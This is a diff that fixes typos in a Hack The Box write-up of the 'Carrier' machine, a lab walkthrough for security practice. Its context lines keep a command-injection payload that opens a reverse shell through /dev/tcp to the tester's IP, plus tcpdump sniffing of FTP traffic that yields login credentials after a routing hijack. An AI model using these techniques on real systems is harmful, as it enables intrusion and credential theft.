@@ -67,14 +67,14 @@ It finds some interesting directories:
 - _/tools_
 
 This directory is an index page with one file called _remote.php_.
-When clicking on in, it shows a message:
+When clicking on it, it shows a message:
 ```markdown
 License expired, exiting...
 ```
 
 - _/doc_
 
-This directory is an index page with two files _diagram_for_tac.png_ and _error_codes.pdf_. The image files shows some network information:
+This directory is an index page with two files _diagram_for_tac.png_ and _error_codes.pdf_. The image file shows some network information:
 
 ![Diagram for tac](https://kyuu-ji.github.io/htb-write-up/carrier/carrier_web-2.png)
 
@@ -140,7 +140,7 @@ POST /diag.php HTTP/1.1
 check=cm9vdDsgZWNobyAiVGVzdCIK
 ```
 
-The response also displays _"Test"_ and proofs command execution so lets start a reverse shell connection:
+The response also displays _"Test"_ and proofs command execution, so lets start a reverse shell connection:
 ```markdown
 echo 'root; bash -i >& /dev/tcp/10.10.14.17/9001 0>&1' | base64
 ```
@@ -285,7 +285,7 @@ Sniffing the traffic with `tcpdump` for FTP packets:
 tcpdump -i any -w ftp-1.pcap port 21
 ```
 
-After sniffing for a little while, the file can be downloaded to our local client for analysis with **Wireshark**.
+After sniffing for a little while, the PCAP file can be downloaded to our local client for analysis with **Wireshark**.
 It shows the captured packets, but the TCP handshake never completes.
 
 This happens because the route from _AS200_ sends the packets to us _(AS100)_ and forwards them from there to _AS300_ where the FTP server is.
@@ -338,7 +338,7 @@ Sniffing the traffic with `tcpdump` for FTP packets again:
 tcpdump -i any -w ftp-2.pcap port 21
 ```
 
-After sniffing for a little while, the file can be downloaded to our local client for analysis with **Wireshark**.
+After sniffing for a little while, the PCAP file can be downloaded to our local client for analysis with **Wireshark**.
 It shows the captured packets and FTP login credentials:
 
 ![Wireshark capture FTP credentials](https://kyuu-ji.github.io/htb-write-up/carrier/carrier_wireshark-1.png)
